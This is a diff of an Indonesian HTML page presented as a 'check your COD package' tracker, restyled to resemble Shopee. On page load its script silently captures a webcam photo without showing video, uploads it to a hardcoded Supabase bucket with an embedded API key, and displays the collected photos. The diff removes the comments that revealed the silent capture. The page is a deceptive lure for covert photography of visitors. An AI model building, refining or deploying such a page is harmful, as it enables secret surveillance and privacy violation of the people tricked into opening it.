@@ -5,15 +5,126 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>CEK PAKET COD MU DISINI</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin: 40px; }
-    #status { margin-top: 20px; font-weight: bold; }
-    #list { margin-top: 30px; }
-    img { width: 200px; margin: 10px; border: 2px solid #333; }
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f5f5f5;
+      color: #333;
+    }
+
+    header {
+      background: #ff5722;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      font-size: 1.3rem;
+      font-weight: bold;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    #status {
+      margin: 20px;
+      font-weight: bold;
+      text-align: center;
+      padding: 10px;
+      border-radius: 6px;
+      display: inline-block;
+      background: #fff3e0;
+      color: #ff5722;
+    }
+
+    #list {
+      margin: 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+      gap: 15px;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.08);
+      padding: 10px;
+      transition: transform 0.2s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+    }
+
+    .card img {
+      width: 100%;
+      border-radius: 8px;
+      border: 1px solid #eee;
+      object-fit: cover;
+    }
+
+    h3 {
+      margin: 20px;
+      font-size: 1.1rem;
+      color: #444;
+    }
+
+    /* Animasi loading ala Shopee */
+    .loading {
+      display: inline-block;
+      position: relative;
+      width: 80px;
+      height: 20px;
+    }
+    .loading div {
+      position: absolute;
+      top: 0;
+      width: 13px;
+      height: 13px;
+      border-radius: 50%;
+      background: #ff5722;
+      animation-timing-function: cubic-bezier(0, 1, 1, 0);
+    }
+    .loading div:nth-child(1) {
+      left: 8px;
+      animation: loading1 0.6s infinite;
+    }
+    .loading div:nth-child(2) {
+      left: 8px;
+      animation: loading2 0.6s infinite;
+    }
+    .loading div:nth-child(3) {
+      left: 32px;
+      animation: loading2 0.6s infinite;
+    }
+    .loading div:nth-child(4) {
+      left: 56px;
+      animation: loading3 0.6s infinite;
+    }
+    @keyframes loading1 {
+      0% { transform: scale(0); }
+      100% { transform: scale(1); }
+    }
+    @keyframes loading2 {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(24px); }
+    }
+    @keyframes loading3 {
+      0% { transform: scale(1); }
+      100% { transform: scale(0); }
+    }
   </style>
 </head>
 <body>
-  <h2>sabar sedang di ce</h2>
-  <div id="status">Mohon tunggu...</div>
+  <header>CEK PAKET COD MU DISINI</header>
+
+  <div id="status">
+    <div class="loading">
+      <div></div><div></div><div></div><div></div>
+    </div>
+    <span> Sedang diproses...</span>
+  </div>
+
   <div id="list"></div>
 
   <!-- Supabase JS -->
@@ -21,7 +132,7 @@
   <script>
     const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
     const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
-    const BUCKET = "foto-users"; // nama bucket
+    const BUCKET = "foto-users"; 
 
     const { createClient } = supabase;
     const client = createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -29,7 +140,6 @@
     const statusEl = document.getElementById("status");
     const listEl = document.getElementById("list");
 
-    // Ambil foto otomatis tanpa menampilkan video
     async function ambilFoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -39,7 +149,6 @@
 
         const fileName = `foto_${Date.now()}.jpg`;
 
-        // Upload ke Supabase Storage
         const { error } = await client.storage
           .from(BUCKET)
           .upload(fileName, blob, {
@@ -49,24 +158,24 @@
           });
 
         if (error) {
-          statusEl.style.color = "red";
-          statusEl.innerText = "Gagal upload: " + error.message;
+          statusEl.style.background = "#ffebee";
+          statusEl.style.color = "#d32f2f";
+          statusEl.innerText = "❌ Gagal upload: " + error.message;
         } else {
-          statusEl.style.color = "green";
-          statusEl.innerText = "Foto berhasil disimpan ke Supabase!";
+          statusEl.style.background = "#e8f5e9";
+          statusEl.style.color = "#388e3c";
+          statusEl.innerText = "✅ Foto berhasil disimpan!";
           tampilkanFoto();
         }
 
-        // Hentikan kamera setelah ambil foto
         track.stop();
-
       } catch (err) {
-        statusEl.style.color = "red";
-        statusEl.innerText = "Tidak bisa ambil foto: " + err;
+        statusEl.style.background = "#ffebee";
+        statusEl.style.color = "#d32f2f";
+        statusEl.innerText = "❌ Tidak bisa ambil foto: " + err;
       }
     }
 
-    // Tampilkan daftar foto dari bucket
     async function tampilkanFoto() {
       const { data, error } = await client.storage.from(BUCKET).list("", {
         sortBy: { column: "created_at", order: "desc" }
@@ -80,15 +189,19 @@
       listEl.innerHTML = "<h3>Daftar Foto</h3>";
       data.forEach(file => {
         const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
+        
+        const card = document.createElement("div");
+        card.className = "card";
+        
         const img = document.createElement("img");
         img.src = publicUrl.publicUrl;
-        listEl.appendChild(img);
+        
+        card.appendChild(img);
+        listEl.appendChild(card);
       });
     }
 
-    // Jalan otomatis setelah izin kamera diberikan
     ambilFoto();
   </script>
 </body>
 </html>
-
